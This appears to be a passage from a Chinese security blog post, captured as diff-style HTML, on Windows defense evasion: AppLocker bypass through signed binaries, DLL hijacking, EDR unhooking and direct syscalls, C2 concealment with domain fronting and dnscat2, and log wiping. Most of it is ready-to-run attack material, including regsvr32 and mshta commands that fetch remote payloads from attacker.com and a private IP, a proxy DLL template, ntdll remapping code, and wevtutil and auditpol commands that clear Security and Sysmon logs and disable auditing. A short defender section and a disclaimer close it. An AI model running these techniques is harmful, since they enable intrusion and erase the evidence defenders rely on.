+<h2 id="四、AppLocker-绕过与-DLL-劫持"><a href="#四、AppLocker-绕过与-DLL-劫持" class="headerlink" title="四、AppLocker 绕过与 DLL 劫持"></a>四、AppLocker 绕过与 DLL 劫持</h2><p>AppLocker 是 Windows 应用程序白名单功能。绕过核心思路是利用受信任的签名二进制文件代理执行恶意代码。</p>
+<h3 id="4-1-签名二进制代理执行（LOLBin）"><a href="#4-1-签名二进制代理执行（LOLBin）" class="headerlink" title="4.1 签名二进制代理执行（LOLBin）"></a>4.1 签名二进制代理执行（LOLBin）</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"># regsvr32 远程脚本执行</span><br><span class="line">regsvr32.exe /s /n /u /i:http://192.168.1.100/payload.sct scrobj.dll</span><br><span class="line"></span><br><span class="line"># mshta 执行 JavaScript</span><br><span class="line">mshta.exe javascript:a=GetObject(&quot;script:http://attacker.com/evil.sct&quot;);a.Exec();</span><br><span class="line"></span><br><span class="line"># rundll32 加载恶意 DLL</span><br><span class="line">rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication&quot;;alert(1)</span><br><span class="line"></span><br><span class="line"># InstallUtil 执行 .NET 装配件</span><br><span class="line">C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /U payload.dll</span><br><span class="line"></span><br><span class="line"># MSBuild 内联 C# 执行</span><br><span class="line">C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe evil.csproj</span><br><span class="line"></span><br><span class="line"># csc.exe 编译执行</span><br><span class="line">C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /out:payload.exe payload.cs</span><br></pre></td></tr></table></figure>
+
+<h3 id="4-2-DLL-劫持与-COM-对象绕过"><a href="#4-2-DLL-劫持与-COM-对象绕过" class="headerlink" title="4.2 DLL 劫持与 COM 对象绕过"></a>4.2 DLL 劫持与 COM 对象绕过</h3><p>DLL 劫持利用 Windows DLL 搜索顺序，将恶意 DLL 放置在合法程序搜索路径中。DLL 不受 AppLocker 默认规则限制。常见劫持目标包括应用程序安装目录中缺失的 DLL、路径重定向漏洞等。</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 代理 DLL 模板</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(linker, <span class="string">&quot;/EXPORT:OriginalFunc=legitimate.OriginalFunc,@1&quot;</span>)</span></span><br><span class="line"><span class="function">BOOL WINAPI <span class="title">DllMain</span><span class="params">(HINSTANCE h, DWORD r, LPVOID v)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (r == DLL_PROCESS_ATTACH) <span class="built_in">WinExec</span>(<span class="string">&quot;calc.exe&quot;</span>, SW_SHOW);</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>利用 COM 对象绕过 AppLocker：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$com</span> = [<span class="type">activator</span>]::CreateInstance([<span class="type">type</span>]::GetTypeFromProgID(<span class="string">&quot;Shell.Application&quot;</span>))</span><br><span class="line"><span class="variable">$com</span>.ShellExecute(<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c whoami&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;open&quot;</span>, <span class="number">0</span>)</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="五、EDR-规避核心原理"><a href="#五、EDR-规避核心原理" class="headerlink" title="五、EDR 规避核心原理"></a>五、EDR 规避核心原理</h2><p>现代 EDR 在内核态注册回调（PsSetCreateProcessNotifyRoutine、ObRegisterCallbacks 等），并结合用户态 hook 实现行为监控。</p>
+<h3 id="5-1-用户态-Hook-解除"><a href="#5-1-用户态-Hook-解除" class="headerlink" title="5.1 用户态 Hook 解除"></a>5.1 用户态 Hook 解除</h3><p>多数 EDR 在 <code>ntdll.dll</code> 函数入口植入 <code>jmp</code> 跳转拦截系统调用。可从磁盘重新映射干净的 ntdll.dll 副本：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">HANDLE hFile = <span class="built_in">CreateFileW</span>(<span class="string">L&quot;\\??\\C:\\Windows\\System32\\ntdll.dll&quot;</span>,</span><br><span class="line">    GENERIC_READ, FILE_SHARE_READ, <span class="literal">NULL</span>, OPEN_EXISTING, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">HANDLE hSection;</span><br><span class="line"><span class="built_in">NtCreateSection</span>(&amp;hSection, SECTION_MAP_READ | SECTION_MAP_EXECUTE,</span><br><span class="line">    <span class="literal">NULL</span>, <span class="literal">NULL</span>, PAGE_EXECUTE, SEC_IMAGE, hFile);</span><br><span class="line">PVOID pNtdll = <span class="literal">NULL</span>;</span><br><span class="line"><span class="built_in">NtMapViewOfSection</span>(hSection, <span class="built_in">GetCurrentProcess</span>(), &amp;pNtdll, <span class="number">0</span>, <span class="number">0</span>, <span class="literal">NULL</span>,</span><br><span class="line">    &amp;viewSize, ViewShare, <span class="number">0</span>, PAGE_EXECUTE);</span><br><span class="line"><span class="comment">// 通过新映射的 ntdll 获取未被 hook 的函数地址执行系统调用</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="5-2-直接系统调用（Direct-Syscall）"><a href="#5-2-直接系统调用（Direct-Syscall）" class="headerlink" title="5.2 直接系统调用（Direct Syscall）"></a>5.2 直接系统调用（Direct Syscall）</h3><p>绕过 ntdll.dll hook 层，直接从汇编执行 <code>syscall</code> 指令。需动态解析系统调用号（SSN），因为不同 Windows 版本号不同：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">DWORD ssn = GetSyscallNumber(<span class="string">&quot;NtOpenProcess&quot;</span>);  <span class="comment">// 从磁盘 ntdll.dll 读取</span></span><br><span class="line">__asm &#123;</span><br><span class="line">    mov r10, rcx</span><br><span class="line">    mov eax, ssn</span><br><span class="line">    syscall</span><br><span class="line">    ret</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="5-3-进程注入与内核回调解除"><a href="#5-3-进程注入与内核回调解除" class="headerlink" title="5.3 进程注入与内核回调解除"></a>5.3 进程注入与内核回调解除</h3><p>利用合法 Windows 进程作为宿主：进程镂空（Process Hollowing）创建挂起进程替换载荷；进程分身（Process Doppelganging）利用 NTFS 事务不留磁盘痕迹；进程重影（Process Herpaderping）使扫描与执行基址偏差。内核级规避可遍历 <code>PspCreateProcessNotifyRoutine</code> 数组移除 EDR 回调，或从 <code>_OBJECT_HEADER</code> 中清除 <code>OB_FLAG_CALLBACK_ENABLED</code> 标记。</p>
+<hr>
+<h2 id="六、C2-通信隐藏技术"><a href="#六、C2-通信隐藏技术" class="headerlink" title="六、C2 通信隐藏技术"></a>六、C2 通信隐藏技术</h2><h3 id="6-1-域前置（Domain-Fronting）"><a href="#6-1-域前置（Domain-Fronting）" class="headerlink" title="6.1 域前置（Domain Fronting）"></a>6.1 域前置（Domain Fronting）</h3><p>域前置利用 CDN 架构：TLS SNI 头填充高信誉域名（如 <code>cdn.cloudflare.com</code>），HTTP Host 头填充真实 C2 域名。中间设备仅看到 SNI 而无法解密 HTTP 层，流量表现为与知名 CDN 的正常通信。需注意主流 CDN 近年已收紧域前置策略。</p>
+<h3 id="6-2-CDN-中继与隧道技术"><a href="#6-2-CDN-中继与隧道技术" class="headerlink" title="6.2 CDN 中继与隧道技术"></a>6.2 CDN 中继与隧道技术</h3><ul>
+<li>在 Cloudflare 中配置 Worker 转发特定路径请求到真实 C2</li>
+<li>使用 Nginx <code>mod_rewrite</code> 条件转发：仅对特定 User-Agent 或 Cookie 的请求转发后端</li>
+<li>利用 GitHub Gist、Pastebin 等公开服务传输指令</li>
+</ul>
+<p>在高度受限内网环境中，DNS 和 ICMP 往往是唯一出网通道：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># dnscat2 服务端</span></span><br><span class="line">ruby dnscat2.rb --dns <span class="string">&quot;domain=example.com&quot;</span> --secret=password</span><br><span class="line"><span class="comment"># 客户端</span></span><br><span class="line">dnscat.exe --dns server=8.8.8.8,domain=example.com --secret=password</span><br></pre></td></tr></table></figure>
+
+<h3 id="6-3-流量伪装与抖动策略"><a href="#6-3-流量伪装与抖动策略" class="headerlink" title="6.3 流量伪装与抖动策略"></a>6.3 流量伪装与抖动策略</h3><ul>
+<li><strong>随机化 Beacon 间隔</strong>：添加 30%-50% 的随机抖动，避免固定心跳</li>
+<li><strong>时间窗口控制</strong>：仅在目标工作时间活跃，夜间休眠</li>
+<li><strong>流量伪装</strong>：模仿浏览器正常访问，携带完整 Cookie、Referer、Accept-Language 头</li>
+</ul>
+<hr>
+<h2 id="七、日志清除技术"><a href="#七、日志清除技术" class="headerlink" title="七、日志清除技术"></a>七、日志清除技术</h2><h3 id="7-1-wevtutil-清除事件日志"><a href="#7-1-wevtutil-清除事件日志" class="headerlink" title="7.1 wevtutil 清除事件日志"></a>7.1 wevtutil 清除事件日志</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">:: 列出所有日志</span><br><span class="line">wevtutil el</span><br><span class="line">:: 清除安全日志</span><br><span class="line">wevtutil cl Security</span><br><span class="line">:: 清除系统日志</span><br><span class="line">wevtutil cl System</span><br><span class="line">:: 清除应用程序日志</span><br><span class="line">wevtutil cl Application</span><br><span class="line">:: 清除 PowerShell 操作日志</span><br><span class="line">wevtutil cl &quot;Microsoft-Windows-PowerShell/Operational&quot;</span><br><span class="line">:: 清除 Sysmon 日志</span><br><span class="line">wevtutil cl &quot;Microsoft-Windows-Sysmon/Operational&quot;</span><br></pre></td></tr></table></figure>
+
+<h3 id="7-2-单条日志过滤删除"><a href="#7-2-单条日志过滤删除" class="headerlink" title="7.2 单条日志过滤删除"></a>7.2 单条日志过滤删除</h3><p>更隐蔽的做法是仅删除与攻击操作相关的条目：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$t</span> = (<span class="built_in">Get-Date</span>).AddHours(<span class="literal">-2</span>)</span><br><span class="line"><span class="variable">$events</span> = <span class="built_in">Get-WinEvent</span> <span class="literal">-FilterHashtable</span> <span class="selector-tag">@</span>&#123;</span><br><span class="line">    LogName   = <span class="string">&quot;Security&quot;</span></span><br><span class="line">    StartTime = <span class="variable">$t</span></span><br><span class="line">    ID        = <span class="selector-tag">@</span>(<span class="number">4624</span>, <span class="number">4625</span>, <span class="number">4672</span>, <span class="number">4688</span>)</span><br><span class="line">&#125; <span class="literal">-MaxEvents</span> <span class="number">1000</span> <span class="literal">-ErrorAction</span> SilentlyContinue</span><br><span class="line"><span class="variable">$events</span> | <span class="built_in">ForEach-Object</span> &#123;</span><br><span class="line">    <span class="built_in">Write-Host</span> <span class="string">&quot;可疑: ID=<span class="variable">$</span>(<span class="variable">$_</span>.Id) Record=<span class="variable">$</span>(<span class="variable">$_</span>.RecordId) Time=<span class="variable">$</span>(<span class="variable">$_</span>.TimeCreated)&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="7-3-auditpol-禁用审计策略"><a href="#7-3-auditpol-禁用审计策略" class="headerlink" title="7.3 auditpol 禁用审计策略"></a>7.3 auditpol 禁用审计策略</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">:: 查看当前审计策略</span><br><span class="line">auditpol /get /category:*</span><br><span class="line">:: 清除所有审计策略</span><br><span class="line">auditpol /clear</span><br><span class="line">:: 禁用进程创建审计（Event ID <span class="number">4688</span>）</span><br><span class="line">auditpol /<span class="built_in">set</span> /subcategory:&quot;Process Creation&quot; /success:disable /failure:disable</span><br><span class="line">:: 禁用登录审计</span><br><span class="line">auditpol /<span class="built_in">set</span> /subcategory:&quot;Logon&quot; /success:disable /failure:disable</span><br><span class="line">:: 恢复审计策略</span><br><span class="line">auditpol /<span class="built_in">restore</span> /file:C:\Windows\System32\GroupPolicy\Machine\Microsoft\Windows NT\Audit\audit.csv</span><br></pre></td></tr></table></figure>
+
+<h3 id="7-4-其他痕迹清理"><a href="#7-4-其他痕迹清理" class="headerlink" title="7.4 其他痕迹清理"></a>7.4 其他痕迹清理</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">:: PSReadLine 历史</span><br><span class="line">Remove-Item (Get-PSReadlineOption).HistorySavePath -Force</span><br><span class="line">:: RDP 连接记录</span><br><span class="line">reg delete &quot;HKCU\Software\Microsoft\Terminal Server Client&quot; /va /f</span><br><span class="line">:: Prefetch 文件</span><br><span class="line"><span class="built_in">del</span> C:\Windows\Prefetch\*.pf /s /f /q</span><br><span class="line">:: 最近文档</span><br><span class="line"><span class="built_in">del</span> /f /s /q <span class="variable">%APPDATA%</span>\Microsoft\Windows\Recent\*</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="八、纵深防御规避与建议"><a href="#八、纵深防御规避与建议" class="headerlink" title="八、纵深防御规避与建议"></a>八、纵深防御规避与建议</h2><h3 id="8-1-攻击链设计原则"><a href="#8-1-攻击链设计原则" class="headerlink" title="8.1 攻击链设计原则"></a>8.1 攻击链设计原则</h3><ul>
+<li><strong>最小化落地文件</strong>：优先使用内存加载和 LOLBin，减少文件系统接触</li>
+<li><strong>分段执行</strong>：将完整攻击链拆分为多个不敏感的独立步骤</li>
+<li><strong>环境感知</strong>：执行前检测沙箱或 EDR 存在，动态调整行为</li>
+<li><strong>加密混淆</strong>：对所有字符串、API 名称和网络流量进行加密</li>
+</ul>
+<p>典型规避链路：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1. 钓鱼 VBA -&gt; 内存混淆 Launcher</span><br><span class="line">2. Launcher 释放 XOR 加密 .NET 装配件 -&gt; 反射加载</span><br><span class="line">3. 加载前修补 AMSI + ETW</span><br><span class="line">4. 干净 ntdll 副本解析 syscall 号进程注入</span><br><span class="line">5. C2 通信域前置 + 自定义编码协议</span><br><span class="line">6. 横向移动优先 WinRM / DCOM</span><br><span class="line">7. wevtutil + auditpol 清理日志</span><br></pre></td></tr></table></figure>
+
+<h3 id="8-2-防御建议"><a href="#8-2-防御建议" class="headerlink" title="8.2 防御建议"></a>8.2 防御建议</h3><p>企业防御方应构建纵深防御体系：</p>
+<ul>
+<li><strong>启用 Windows Defender ASR 规则</strong>：阻止常见 LOLBin 子进程创建</li>
+<li><strong>强化 AMSI 完整性</strong>：对关键 API 进行完整性校验，检测内存修补</li>
+<li><strong>ETW 完整性监控</strong>：监控 <code>EtwEventWrite</code> 等关键函数修改</li>
+<li><strong>应用程序控制</strong>：合理配置 AppLocker &#x2F; WDAC，阻断非受信 DLL 加载</li>
+<li><strong>Sysmon + 集中式 SIEM</strong>：收集关联端点日志，检测异常系统调用和日志清除</li>
+<li><strong>网络层检测</strong>：监控非标准 DNS 流量、ICMP 异常包大小及 TLS SNI 与 Host 不一致</li>
+</ul>
+<hr>
+<h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>免杀与防御规避是一场持续的军备竞赛。攻击者不断挖掘新的 LOLBin、AMSI 绕过向量和更隐蔽的 C2 通道，防御方则通过内核传感器、行为分析和机器学习不断提升检测能力。理解攻击者思维模式和技术细节，是构建有效防御体系的前提。本文仅作技术参考，读者应在合法合规前提下学习和实践。</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag"># 渗透测试</a>
+              <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" rel="tag"># 内网渗透</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/Mobile-iOS-security/" rel="prev" title="移动安全：iOS APP 安全测试">
+                  <i class="fa fa-angle-left"></i> 移动安全：iOS APP 安全测试
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/XXE-basics-file-read/" rel="next" title="XXE 基础注入与文件读取">
+                  XXE 基础注入与文件读取 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2026</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">YunShang</span>
+  </div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+</body>
+</html>
